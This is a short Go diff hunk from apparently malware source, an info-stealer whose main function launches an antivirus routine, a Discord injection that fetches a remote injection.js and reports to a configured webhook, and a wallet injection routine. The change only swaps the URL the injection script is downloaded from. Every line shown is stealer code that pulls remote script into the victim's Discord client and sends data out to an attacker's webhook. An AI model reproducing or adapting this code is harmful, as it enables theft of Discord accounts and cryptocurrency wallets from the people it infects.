@@ -50,7 +50,7 @@ func main() {
 	go antivirus.Run()
 
 	go discordinjection.Run(
-		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
+		"https://github.com/0xFl4q/tktpascousin/main/injection.js",
 		CONFIG["webhook"].(string),
 	)
 	go walletsinjection.Run(
